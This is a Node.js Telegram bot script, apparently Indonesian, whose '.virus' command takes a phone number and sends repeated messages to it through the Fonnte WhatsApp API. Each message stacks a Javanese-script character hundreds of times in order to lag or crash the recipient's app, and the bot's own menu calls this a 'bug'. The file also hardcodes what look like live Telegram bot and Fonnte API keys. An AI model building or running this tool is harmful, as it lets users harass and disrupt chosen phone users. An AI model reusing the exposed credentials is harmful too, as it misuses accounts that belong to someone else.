// bot_kirim2_mod.js
// npm install node-telegram-bot-api axios
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8499584477:AAEwTvcdjckwU_vHJ6C2dgUUfqoiKbmUFNQ';
const FONNTE_KEY    = process.env.FONNTE_KEY    || 'XX8gu3vf6FkFrx5aYfvL';
if (!TELEGRAM_TOKEN || !FONNTE_KEY) {
  console.error('❌ Harap set TELEGRAM_TOKEN & FONNTE_KEY');
  process.exit(1);
}

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const sleep = ms => new Promise(r => setTimeout(r, ms));
const make20 = txt => Array.from({ length: 20 }).map(() => txt).join('\n');

// ================== EVENT PESAN ==================
bot.on('message', async msg => {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();

  try {
    // ========== .menu ==========
    if (text === '.menu') {
      if (!fs.existsSync('./nina.jpg'))
        return bot.sendMessage(chatId, '❌ Foto nina.jpg tidak ditemukan!');

      const caption = `こんにちは、私はrifatによって作られたボット *lawliet bot* です\n\n*Dev:* @rifat M rifat\n*Name bot:* lawliet bot\n*Version:* v2 
\nいらっしゃいませ`;

      const opts = {
        caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: '📜 MENU BUG', callback_data: 'menu_bot' }]
          ]
        }
      };

      await bot.sendChatAction(chatId, 'upload_photo');
      await bot.sendPhoto(chatId, fs.readFileSync('./nina.jpg'), opts);
      return;
    }

    // ========== .virus ==========
    if (!text.startsWith('.virus')) return;

    const parts = text.split(/\s+/);
    const target = parts[1];
    const isi = parts.slice(2).join(' ') || 'ꦾ '.repeat(500);

    if (!target)
      return bot.sendMessage(chatId, 'Format: .virus 62812xxxx [isi]');

    const payload = make20(isi);
    const statusMsg = await bot.sendMessage(chatId, `🚀 Mengirim ke *${target}*...`, { parse_mode: 'Markdown' });

    let sukses = 0, gagal = 0;
    const total = 5; // ubah angka ini jika ingin lebih banyak

    for (let i = 1; i <= total; i++) {
      try {
        const res = await axios.post(
          'https://api.fonnte.com/send',
          { target: target.trim(), message: payload },
          { headers: { Authorization: FONNTE_KEY }, timeout: 10000 }
        );
        if (res.data && res.data.status === true) sukses++;
        else gagal++;
      } catch {
        gagal++;
      }

      if (i % 5 === 0 || i === total) {
        const bar = '▰'.repeat(i / 2) + '▱'.repeat((total - i) / 2);
        await bot.editMessageText(
          `📤 *Progress ${i}/${total}*\n${bar}\n✅ Sukses: ${sukses}\n❌ Gagal: ${gagal}`,
          { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
        );
      }

      await sleep(30);
    }

    // kirim hasil akhir
    if (fs.existsSync('./mani.jpg')) {
      const caption = `✅ *SUCCESS* send *${target}*\nMereka hanyalah rakyat biasa`;
      await bot.sendChatAction(chatId, 'upload_photo');
      await bot.sendPhoto(chatId, fs.readFileSync('./mani.jpg'), { caption, parse_mode: 'Markdown' });
    } else {
      await bot.sendMessage(chatId, `✅ SUCCESS send ${target}\nMereka hanyalah rakyat biasa`);
    }

  } catch (err) {
    console.error('Error:', err.message);
    await bot.sendMessage(chatId, '❌ Terjadi kesalahan. Cek koneksi atau API key.');
  }
});

// ================== CALLBACK MENU ==================
bot.on('callback_query', async query => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data === 'menu_bot') {
    if (!fs.existsSync('./mama.jpg'))
      return bot.sendMessage(chatId, '❌ Foto mama.jpg tidak ditemukan!');

    const caption = `番号を入力して直接送信\n\n*DEV:* RIFAT\n*V:* v1\n\n送信 .virus 62××××××\nまだ受け入れる`;

    await bot.sendChatAction(chatId, 'upload_photo');
    await bot.sendPhoto(chatId, fs.readFileSync('./mama.jpg'), { caption, parse_mode: 'Markdown' });
    await bot.answerCallbackQuery(query.id, { text: '📋 Menampilkan menu bot...' });
  }
});
